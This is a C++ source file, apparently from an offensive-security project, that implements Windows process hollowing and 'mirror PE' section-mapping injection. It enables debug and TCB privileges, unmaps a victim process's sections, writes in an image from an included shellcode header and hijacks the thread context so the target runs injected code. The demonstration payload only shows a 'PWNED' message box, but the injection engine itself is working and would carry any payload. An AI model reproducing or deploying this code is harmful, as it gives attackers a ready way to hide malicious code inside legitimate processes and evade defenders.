#include "NTHeaders.h"
#include <TlHelp32.h>
#include <iostream>
#include "Shellcode.h"

//for giving the process debug and tcb privileges to not get unnecessary errors during hollowing or mapping
void enable_priv()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);

	LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid);

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);

	CloseHandle(hToken);
}

//The function that will be injected to the remote process
int malicious_func() {
	MessageBox(0, "I am the malicious function >:)", "PWNED", 0);
	return 0;
}

inline bool file_exists(const const char* name) {
	struct stat buffer;
	return (stat(name, &buffer) == 0);
}

//=====================================HOLLOW_PE MODULE=====================================
BOOL hollow_pe(HANDLE hProcess, HANDLE hThread) {
	PAYLOAD* newproc = new PAYLOAD;
	PDWORD dwImageBase = 0;

	__T_NtUnmapViewOfSection NtUnmapViewOfSection;
	newproc->dosHeader = PIMAGE_DOS_HEADER(pImage);

	if (newproc->dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[-] File is not an executable image\n");
		return FALSE;
	}
	newproc->ntHeader = PIMAGE_NT_HEADERS((DWORD_PTR)newproc->dosHeader + newproc->dosHeader->e_lfanew);
	if (newproc->ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		printf("[-] File does not have a valid PE header\n");
		return FALSE;
	}
	printf("[*] Allocating memory for thread context\n");
	//newproc->ctx = (PCONTEXT)VirtualAlloc(NULL, sizeof(newproc->ctx), MEM_COMMIT, PAGE_READWRITE);
	newproc->ctx.ContextFlags = CONTEXT_FULL;
	/*if (!newproc->ctx) {
		printf("[-] Allocating memory for context failed\n");
		return FALSE;
	}*/
	printf("[+] Allocated memory for context\n");
	if (!GetThreadContext(hThread, &newproc->ctx)) {
		printf("[-] Could not get the thread context %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Got the thread context\n");
	if (!ReadProcessMemory(hProcess, LPCVOID(newproc->ctx.Ebx + 8), LPVOID(&dwImageBase), 4, NULL)) {
		printf("[-] Error reading process memory %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Read the image base: 0x%08x\n\n", dwImageBase);
	printf("[*] Allocating memory in remote process\n");
	LPVOID RemoteAddress = NULL;//(LPVOID)newproc->ntHeader->OptionalHeader.ImageBase;
	newproc->pImageBase = VirtualAllocEx(hProcess, &RemoteAddress, newproc->ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!newproc->pImageBase) {
		printf("[-] Failed to allocate memory %d\n", GetLastError());
		//newproc->pImageBase = VirtualAllocEx(hProcess, &RemoteAddress, newproc->ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		printf("%d", GetLastError());
		return FALSE;
	}
	printf("[+] Allocated memory Start address: 0x%08x\n", newproc->pImageBase);

	if (!WriteProcessMemory(hProcess, newproc->pImageBase, pImage, newproc->ntHeader->OptionalHeader.SizeOfHeaders, NULL)) {
		printf("[-] Error writing to process memory %d\n", GetLastError());
		return FALSE;
	}
	DWORD dwOldProtect;
	NtUnmapViewOfSection = (__T_NtUnmapViewOfSection)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection");
	for (int i = 0; i < newproc->ntHeader->FileHeader.NumberOfSections; i++) {
		newproc->secHeader = PIMAGE_SECTION_HEADER(DWORD(pImage) + newproc->dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER)*i);
		//Unmap the original section of the victim process
		NtUnmapViewOfSection(hProcess, PVOID(DWORD(newproc->pImageBase) + newproc->secHeader->VirtualAddress));
		
		if (!WriteProcessMemory(hProcess, LPVOID(DWORD(newproc->pImageBase) + newproc->secHeader->VirtualAddress), LPVOID(DWORD(pImage) + newproc->secHeader->PointerToRawData), newproc->secHeader->Misc.VirtualSize, NULL)) {
			printf("[-] Error writing to process memory %d\n", GetLastError());
			return FALSE;
		}
		printf("[+] Wrote section %s, 0x%08x -> 0x%08x\n", newproc->secHeader->Name, DWORD(newproc->pImageBase) + newproc->secHeader->VirtualAddress, DWORD(newproc->pImageBase) + newproc->secHeader->VirtualAddress + newproc->secHeader->Misc.VirtualSize);
	}

	if (!WriteProcessMemory(hProcess, LPVOID(newproc->ctx.Ebx + 8), &newproc->pImageBase, 4, NULL)) {
		printf("[-] Error writing process %d\n", GetLastError());
		return FALSE;
	}
	newproc->ctx.Eax = DWORD(newproc->pImageBase) + newproc->ntHeader->OptionalHeader.AddressOfEntryPoint;
	printf("[*] Address of entry point: 0x%08x\n", newproc->ctx.Eax);
	if (!SetThreadContext(hThread, LPCONTEXT(&newproc->ctx))) {
		printf("[-] Could not set the thread context %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Thread context is set\n");
	if (!ResumeThread(hThread)) {
		printf("[-] Could not resume the thread %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Thread is running...\n");

	return TRUE;
}

//=====================================MIRROR_PE MODULE=====================================

//Because we are mapping our own section to a remote process relocation table has to be fixed
BOOL reloc_fixup(LPVOID localSecBase, LPVOID remoteSecBase)
{
	//since we only need only the ntheader and optionalheader i did not feel the need to create a PAYLOAD object
	PIMAGE_NT_HEADERS ntHeader = PIMAGE_NT_HEADERS(DWORD(localSecBase) + PIMAGE_DOS_HEADER(localSecBase)->e_lfanew);
	//delta is basically the difference between the remoteBase and the localBase
	//helps with calculations
	DWORD delta = DWORD(remoteSecBase) - ntHeader->OptionalHeader.ImageBase;
	printf("[*] Current ImageBase 0x%08x\n", ntHeader->OptionalHeader.ImageBase);
	DWORD eoff, targetCount;
	PWORD targetOffset;

	//Pointer to relocation table is stored in the DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC] and is an RVA(Relative Virtual Address)
	DWORD dwRelocTableOffset = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	DWORD dwRelocTableSize = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	//To get the Absolute Address we need to add RVA to the section Base address
	PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((DWORD)localSecBase + dwRelocTableOffset);

	for (int target = 0; target < dwRelocTableSize; target += reloc->SizeOfBlock, *(DWORD*)&reloc += reloc->SizeOfBlock) {
		targetCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		targetOffset = (PWORD)((DWORD)reloc + sizeof(IMAGE_BASE_RELOCATION));
		printf("[*] Reloc VA: 0x%08x TargetCount: %d TargetOffset: 0x%08x\n", (DWORD)localSecBase + reloc->VirtualAddress, targetCount, (DWORD)targetOffset- (DWORD)localSecBase - reloc->VirtualAddress);
		for (int sub_target = 0; sub_target < targetCount; sub_target++) {

			//the entries are stored in 4 bytes. first one determines the type
			//IMAGE_REL_BASE_HIGHLOW, IMAGE_REL_BASE_LOW etc.
			//other 3 are the RVA to the target
			if ((targetOffset[sub_target] >> 12) & IMAGE_REL_BASED_HIGHLOW) {
				//get the virtual address of the target: last 3 bytes
				eoff = reloc->VirtualAddress + (*(PDWORD)(targetOffset+sub_target) & 0xfff);
				//move the local section base to the remote section base
				*(PDWORD)((DWORD)localSecBase + eoff) += delta;
			}
		}
	}
	return TRUE;
}






BOOL mirror_pe(HANDLE hProcess, HANDLE hThread) {

	PPAYLOAD newproc = new PAYLOAD;
	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	__T_NtCreateSection NtCreateSection = (__T_NtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
	__T_NtMapViewOfSection NtMapViewOfSection = (__T_NtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
	__T_NtUnmapViewOfSection NtUnmapViewOfSection = (__T_NtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
	__T_NtClose NtClose = (__T_NtClose)GetProcAddress(ntdll, "NtClose");


	HANDLE hSection = NULL;
	LARGE_INTEGER SectionMaxSize = { 0,0 };//Because NtCreateSection requires LARGE_INTEGER for the SextionMaxSize
	LPVOID LocalAddress = NULL;
	LPVOID RemoteAddress = NULL;
	DWORD ViewSize = 0;

	newproc->pImageBase = GetModuleHandle(0);//(DWORD)pImage
	newproc->dosHeader = (PIMAGE_DOS_HEADER)newproc->pImageBase;
	newproc->ntHeader = (PIMAGE_NT_HEADERS)(DWORD(newproc->pImageBase) + newproc->dosHeader->e_lfanew);
	if (newproc->ntHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("[-] File doesn't have a valid PE signature\n");
		ExitProcess(0);
	}
	SectionMaxSize.LowPart = newproc->ntHeader->OptionalHeader.SizeOfImage;

	//Create a new section with all the permissions
	NtCreateSection(&hSection, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &SectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	//error handling could be implemented but.. like i said i am lazy :)
	if (hSection == NULL || hSection == INVALID_HANDLE_VALUE) {
		printf("[-] Could not create the section %d\n", GetLastError());
	}
	printf("[+] Section created\n");
	//Map the view of the section to the local process. LocalAddress is the address the section will be mapped
	NtMapViewOfSection(hSection, GetCurrentProcess(), &LocalAddress, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE);

	//Map a view of the section into the remote process. RemoteAddress is the address the section will be mapped
	NtMapViewOfSection(hSection, hProcess, &RemoteAddress, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE);

	//Copy the contents of this image to the section offset
	memcpy(LocalAddress, newproc->pImageBase, newproc->ntHeader->OptionalHeader.SizeOfImage);
	//fix the reloc table
	reloc_fixup(LocalAddress, RemoteAddress);

	//don't need the local section anymore
	if (LocalAddress)
		NtUnmapViewOfSection(GetCurrentProcess(), LocalAddress);

	if (hSection) {
		NtClose(hSection);
		hSection = NULL;
	}

	if (!RemoteAddress)
	{
		printf("[-] Could not map to the remote process\n");
		return FALSE;
	}

	newproc->ctx.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(hThread, &newproc->ctx))
	{
		printf("[-] Could not get the thread context %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Got the thread context\n");
	newproc->ctx.Eax = (DWORD)((DWORD)&malicious_func - (DWORD)GetModuleHandle(NULL)) + (DWORD)RemoteAddress;

	if (!SetThreadContext(hThread, &newproc->ctx))
	{
		printf("[-] Could not set the thread context %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Thread context is set\n");
	if (!ResumeThread(hThread))
	{
		printf("[-] Could not resume the thread %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Thread is running...\n");
	return TRUE;
}

